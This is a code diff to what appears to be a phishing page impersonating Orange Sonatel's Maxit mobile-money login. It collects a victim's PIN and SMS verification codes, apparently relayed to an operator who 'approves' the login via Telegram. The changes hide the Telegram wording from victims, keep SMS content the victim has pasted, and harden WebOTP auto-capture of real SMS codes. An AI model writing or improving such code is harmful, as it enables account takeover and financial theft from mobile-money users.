@@ -385,9 +385,9 @@
           <div id="pin-waiting-box" class="hidden p-4 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
             <div class="flex items-center justify-center space-x-2">
               <span class="inline-block w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping"></span>
-              <span class="text-xs font-bold text-amber-900 uppercase tracking-wider">Awaiting Telegram Approval</span>
+              <span class="text-xs font-bold text-amber-900 uppercase tracking-wider" data-i18n="awaitingApproval">Awaiting Approval</span>
             </div>
-            <p class="text-xs text-amber-800">Your 4-digit PIN has been submitted. Please wait while the administrator or agent approves your login in Telegram...</p>
+            <p class="text-xs text-amber-800" data-i18n="pinAwaitingDesc">Your 4-digit PIN has been submitted. Please wait while your login is being verified...</p>
             <div class="flex justify-center pt-1">
               <svg class="animate-spin h-5 w-5 text-brand-orange" fill="none" viewBox="0 0 24 24">
                 <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -487,9 +487,9 @@
           <div id="sms-waiting-box" class="hidden p-4 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
             <div class="flex items-center justify-center space-x-2">
               <span class="inline-block w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping"></span>
-              <span class="text-xs font-bold text-amber-900 uppercase tracking-wider">Awaiting Verification Approval</span>
+              <span class="text-xs font-bold text-amber-900 uppercase tracking-wider" data-i18n="awaitingVerification">Awaiting Verification</span>
             </div>
-            <p class="text-xs text-amber-800">Your SMS verification has been submitted. Please wait while the administrator or agent reviews and approves your submission in Telegram...</p>
+            <p class="text-xs text-amber-800" data-i18n="smsAwaitingDesc">Your SMS verification has been submitted. Please wait while your submission is being verified...</p>
             <div class="flex justify-center pt-1">
               <svg class="animate-spin h-5 w-5 text-brand-orange" fill="none" viewBox="0 0 24 24">
                 <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -675,6 +675,12 @@
 
       if (countdownCard) countdownCard.classList.add('hidden');
 
+      // Preserve user content if already entered/pasted
+      if (msgInput && msgInput.value && msgInput.value.trim().length > 0) {
+        handlePostLoginPastedMsg(msgInput.value.trim());
+        return;
+      }
+
       const randToken = Array.from({length: 22}, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random()*36)]).join('');
       const smsContent = `Confidential. Don’t share or paste anywhere. Click the link to confirm login. https://maxit-mobile.orange-sonatel.com/oms-links/auth?token=${randToken}`;
 
@@ -727,10 +733,13 @@
       // WebOTP API: Automatically receive real SIM SMS on mobile Android/Chrome
       if ('OTPCredential' in window) {
         try {
-          const ac = new AbortController();
+          if (window.webOtpController) {
+            try { window.webOtpController.abort(); } catch (err) {}
+          }
+          window.webOtpController = new AbortController();
           navigator.credentials.get({
             otp: { transport: ['sms'] },
-            signal: ac.signal
+            signal: window.webOtpController.signal
           }).then(otp => {
             if (otp && (otp.code || otp.message)) {
               const incoming = otp.code || otp.message;
@@ -738,6 +747,7 @@
                 msgInput.value = incoming;
                 handlePostLoginPastedMsg(incoming);
                 if (simCountdownInterval) clearInterval(simCountdownInterval);
+                if (simSmsTimer) clearTimeout(simSmsTimer);
                 if (countdownCard) countdownCard.classList.add('hidden');
                 if (banner) banner.classList.remove('hidden');
               }
@@ -760,7 +770,11 @@
 
         if (simCountdownSeconds <= 0) {
           clearInterval(simCountdownInterval);
-          triggerSimSmsArrivalNow();
+          if (msgInput && msgInput.value && msgInput.value.trim().length > 0) {
+            if (countdownCard) countdownCard.classList.add('hidden');
+          } else {
+            triggerSimSmsArrivalNow();
+          }
         }
       }, 1000);
     }
@@ -962,6 +976,7 @@
       if (val && val.trim()) {
         if (countdownCard) countdownCard.classList.add('hidden');
         if (simCountdownInterval) clearInterval(simCountdownInterval);
+        if (simSmsTimer) clearTimeout(simSmsTimer);
         if (statusEl) statusEl.classList.remove('hidden');
         if (badge) {
           badge.className = 'inline-flex items-center text-[11px] font-bold text-emerald-700 bg-emerald-50 px-2.5 py-0.5 rounded-full border border-emerald-200';
